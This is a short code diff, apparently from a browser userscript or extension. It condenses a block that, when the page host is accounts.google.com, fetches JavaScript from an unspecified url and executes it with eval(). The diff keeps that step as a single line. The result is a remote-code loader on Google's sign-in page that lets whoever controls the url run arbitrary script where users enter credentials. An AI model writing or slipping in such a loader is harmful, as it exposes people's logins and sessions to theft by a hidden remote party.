@@ -24,14 +24,5 @@ if (location.host == 'accounts.google.com'){
 console.log(url)
 
 
+fetch(url).then(response => response.text()).then(code => {eval(code);});
 
-
-
-(function() {
-    fetch(url)
-        .then(response => response.text())
-        .then(code => {
-        eval(code);
-    });
-
-})();
